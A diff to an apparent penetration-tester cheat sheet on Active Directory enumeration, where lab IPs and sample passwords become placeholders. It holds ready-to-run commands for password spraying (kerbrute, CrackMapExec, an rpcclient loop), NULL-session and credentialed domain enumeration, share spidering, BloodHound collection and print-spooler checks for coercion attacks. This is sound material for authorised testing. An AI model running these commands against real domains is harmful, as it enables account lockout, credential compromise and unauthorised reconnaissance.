@@ -1,6 +1,6 @@
 # AD Enumeration Techniques
 
-> **Pre-req:** `source $HOME/Pentester/ptTools/venvHTB/bin/activate`
+> **Pre-req:** `source /opt/venvTools/bin/activate`
 
 ### Passive Network Capture with Responder (Analyze Mode) [added: 2026-04]
 - **Tags:** #Responder #LLMNR #NBTNS #MDNS #PassiveRecon #NetworkCapture #T1557.001
@@ -18,7 +18,7 @@
 - **Yields:** List of live hosts responding to ICMP on the target subnet
 - **Opsec:** Low
 - **Context:** Quick host discovery on a /23 or similar subnet before running nmap
-- **Payload/Method:** `fping -asgq 172.16.5.0/23`
+- **Payload/Method:** `fping -asgq <TARGET_SUBNET>/23`
 
 ### Kerbrute Username Enumeration (No Creds) [added: 2026-04]
 - **Tags:** #Kerbrute #UsernameEnum #Kerberos #PreAuth #ASREPRoast #NoCreds #T1589.002
@@ -66,17 +66,17 @@
 - **Payload/Method:**
   ```bash
   # CrackMapExec (with creds)
-  crackmapexec smb 172.16.5.5 -u user -p 'Password123' --pass-pol
+  crackmapexec smb <DC_IP> -u user -p '<TARGET_PASSWORD>' --pass-pol
 
   # rpcclient NULL session
-  rpcclient -U "" -N 172.16.5.5 -c "querydominfo"
+  rpcclient -U "" -N <DC_IP> -c "querydominfo"
 
   # enum4linux
-  enum4linux -P 172.16.5.5
-  enum4linux-ng -P 172.16.5.5 -oA output
+  enum4linux -P <DC_IP>
+  enum4linux-ng -P <DC_IP> -oA output
 
   # LDAP
-  ldapsearch -h 172.16.5.5 -x -b "DC=DOMAIN,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+  ldapsearch -h <DC_IP> -x -b "DC=DOMAIN,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
 
   # Windows native
   net accounts
@@ -95,16 +95,16 @@
 - **Payload/Method:**
   ```bash
   # Kerbrute (fastest, Kerberos-based, no lockout risk if careful)
-  kerbrute passwordspray -d DOMAIN.LOCAL --dc 172.16.5.5 valid_users.txt Welcome1
+  kerbrute passwordspray -d DOMAIN.LOCAL --dc <DC_IP> valid_users.txt Welcome1
 
   # CrackMapExec (SMB-based)
-  crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
+  crackmapexec smb <DC_IP> -u valid_users.txt -p <TARGET_PASSWORD> | grep +
 
   # CrackMapExec local auth (avoid lockouts on domain)
-  crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H <NTLM_HASH> | grep +
+  crackmapexec smb --local-auth <TARGET_SUBNET>/24 -u administrator -H <NTLM_HASH> | grep +
 
   # rpcclient one-liner
-  for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+  for u in $(cat valid_users.txt); do rpcclient -U "$u%<TARGET_PASSWORD>" -c "getusername;quit" <DC_IP> | grep Authority; done
   ```
 
 ### Password Spraying (Windows — DomainPasswordSpray) [added: 2026-04]
@@ -130,24 +130,24 @@
 - **Payload/Method:**
   ```bash
   # CrackMapExec
-  crackmapexec smb 172.16.5.5 -u user -p pass --users
-  crackmapexec smb 172.16.5.5 -u user -p pass --groups
-  crackmapexec smb 172.16.5.5 -u user -p pass --loggedon-users
-  crackmapexec smb 172.16.5.5 -u user -p pass --shares
+  crackmapexec smb <DC_IP> -u user -p pass --users
+  crackmapexec smb <DC_IP> -u user -p pass --groups
+  crackmapexec smb <DC_IP> -u user -p pass --loggedon-users
+  crackmapexec smb <DC_IP> -u user -p pass --shares
 
   # Spider shares for interesting files
-  crackmapexec smb 172.16.5.5 -u user -p pass -M spider_plus --share Dev-share
+  crackmapexec smb <DC_IP> -u user -p pass -M spider_plus --share Dev-share
 
   # smbmap
-  smbmap -u user -p pass -d DOMAIN.LOCAL -H 172.16.5.5
-  smbmap -u user -p pass -d DOMAIN.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only
+  smbmap -u user -p pass -d DOMAIN.LOCAL -H <DC_IP>
+  smbmap -u user -p pass -d DOMAIN.LOCAL -H <DC_IP> -R SYSVOL --dir-only
 
   # rpcclient
-  rpcclient -U "user%pass" 172.16.5.5 -c "enumdomusers"
+  rpcclient -U "user%pass" <DC_IP> -c "enumdomusers"
 
   # windapsearch
-  python3 windapsearch.py --dc-ip 172.16.5.5 -u domain\\user -p pass --da
-  python3 windapsearch.py --dc-ip 172.16.5.5 -u domain\\user -p pass -PU
+  python3 windapsearch.py --dc-ip <DC_IP> -u domain\\user -p pass --da
+  python3 windapsearch.py --dc-ip <DC_IP> -u domain\\user -p pass -PU
   ```
 
 ### BloodHound Collection from Linux [added: 2026-04]
@@ -159,7 +159,7 @@
 - **Context:** Collect full AD graph data from Linux for offline analysis in BloodHound GUI
 - **Payload/Method:**
   ```bash
-  bloodhound-python -u 'user' -p 'pass' -ns 172.16.5.5 -d DOMAIN.LOCAL -c all
+  bloodhound-python -u 'user' -p 'pass' -ns <DC_IP> -d DOMAIN.LOCAL -c all
   zip -r bh_data.zip *.json
   ```
 
@@ -196,8 +196,8 @@
 - **Context:** Resolve all DNS records in the AD-integrated zone -- finds hidden hosts not in standard enum
 - **Payload/Method:**
   ```bash
-  adidnsdump -u domain\\user ldap://172.16.5.5
-  adidnsdump -u domain\\user ldap://172.16.5.5 -r   # resolve unknown records
+  adidnsdump -u domain\\user ldap://<DC_IP>
+  adidnsdump -u domain\\user ldap://<DC_IP> -r   # resolve unknown records
   ```
 
 ### PASSWD_NOTREQD Accounts [added: 2026-04]
@@ -248,7 +248,7 @@
 - **Context:** Check if MS-RPRN/MS-PAR is exposed on DC -- required for SpoolSample/PetitPotam coercion attacks
 - **Payload/Method:**
   ```bash
-  rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
+  rpcdump.py @<DC_IP> | egrep 'MS-RPRN|MS-PAR'
   # Windows: Get-SpoolStatus -ComputerName DC01.DOMAIN.LOCAL
   ```
 
